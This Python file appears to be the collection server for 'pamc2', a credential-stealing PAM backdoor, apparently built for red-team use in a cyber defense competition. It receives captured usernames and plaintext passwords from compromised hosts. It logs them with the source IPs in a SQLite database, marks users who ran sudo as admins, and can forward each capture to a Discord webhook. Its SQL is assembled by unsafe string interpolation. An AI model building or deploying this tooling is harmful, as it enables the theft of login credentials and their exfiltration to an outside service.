import os
import socket
import sqlite3
import argparse
import requests
import threading
from dotenv import load_dotenv

def server_args():
    parser = argparse.ArgumentParser(description="Server meant for use with pamc2")
    parser.add_argument('-p', '--port', metavar="<LISTENING PORT>", help="Port number to listen on (default 5000)", 
                        type="int", dest="port", action="store", default="5000")
    parser.add_argument('--discord', help="Enable Discord Webhook (set WEBHOOK_URL env var)")
    parser.add_argument('--minimal', help="Only print updates")
    parser.add_argument('--nodb', help="Run the server without utilizing the database")
    return parser.parse_args()

def send_discord(addr, data):
    hook_data = {
        'content': data,
        'username': 'kms bot',
        'avatar_url': 'https://cdn.discordapp.com/emojis/1203535228975448094.webp',
        'embeds': [{
            'description': "type shit",
            'color': 15258703
        }]
    }

    response = requests.post(os.getenv('WEBHOOK_URL'), json=hook_data)

def write_db(addr, data):
    conn = sqlite3.connect('logins.db')
    cursor = conn.cursor()

    ip = addr[0]
    message = data.split("-")[1].split(":")[0].strip()
    username = data.split("-")[1].split(":")[1].strip()
    password = data.split("-")[1].split(":")[2].strip()

    if (message == "USER AUTHENTICATED" or message == "USER CHANGED PASSWORD"):
        message_type = 1
    elif (message == "SUDO SESSION OPENED"):
        message_type = 2
    else:
        message_type = -1

    cursor.execute(f'''
    CREATE TABLE IF NOT EXISTS passwords(
        ip TEXT NOT NULL,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        known_admin INTEGER DEFAULT 0,
        PRIMARY KEY (ip, username)
    ); ''')

    user_in_table = conn.execute(f'''
    SELECT password, known_admin FROM passwords
    WHERE username = '{username}' AND ip = '{ip}'; ''')

    userexists = [x for x in user_in_table]

    if (message_type == 1): # authenticated/chpasswd
        
        if (len(userexists) == 0):
            cursor.execute(f'''
            INSERT INTO passwords(ip, username, password)
            VALUES ('{ip}', '{username}', '{password}');
            ''')

        elif (userexists[0][0] != password):
            cursor.execute(f'''
            UPDATE passwords
            SET password = '{password}'
            WHERE username = '{username}';
            ''')

        else:
            print("unknown error adding authenticated user to databse")
    
    elif (message_type == 2): # sudo

        if (len(userexists) != 0):
            if (userexists[0][1] != 1):
                cursor.execute(f'''
                UPDATE passwords
                SET known_admin = 1
                WHERE username = '{username}';
                ''')
        else:
            print("no clue how you got here")

    else:
        print("Unknown Error adding user to database")

    conn.commit()
    conn.close()

def handle_client(lock, c, addr, cmd_args):
    data = c.recv(1024).decode()
    print(f"Received from {addr} - {data}")

    lock.acquire()

    if (not cmd_args.nodb):
        write_db(addr, data)

    if (cmd_args.discord):
        send_discord(addr, data)
    
    lock.release()

    c.close()

def main():
    load_dotenv()
    cmd_args = server_args()

    if (cmd_args.discord and not os.getenv("WEBHOOK_URL")):
        print("You must set a WEBHOOK_URL environment variable to use --discord! Please either create a .env file with the WEBHOOK_URL or set the environment variable globally to use this setting.")
        exit(1)

    server_socket = socket.socket()
    print("Created socket")

    server_socket.bind(('', cmd_args.port))
    server_socket.listen()
    print(f"Server listening for incoming connections on port {cmd_args.port}...")

    lock = threading.Lock()

    while True:
        client_socket, addr = server_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args))
        client_thread.start()

# def main():
#     write_db(('10.0.10.208', '21314'), "10.0.10.208 - USER AUTHENTICATED: ccdc:password")
#     write_db(('10.0.10.208', '97123'), "10.0.10.208 - USER AUTHENTICATED: ccdc:password")
#     write_db(('10.0.10.208', '12356'), "10.0.10.208 - USER CHANGED PASSWORD: ccdc:newpassword")
#     write_db(('10.0.10.208', '97123'), "10.0.10.208 - USER AUTHENTICATED: ccdc:newpassword")
#     write_db(('10.0.10.208', '82734'), "10.0.10.208 - SUDO SESSION OPENED: ccdc::")
#     write_db(('10.0.10.208', '97123'), "10.0.10.208 - USER AUTHENTICATED: bob:bob123")

if (__name__ == '__main__'):
    main()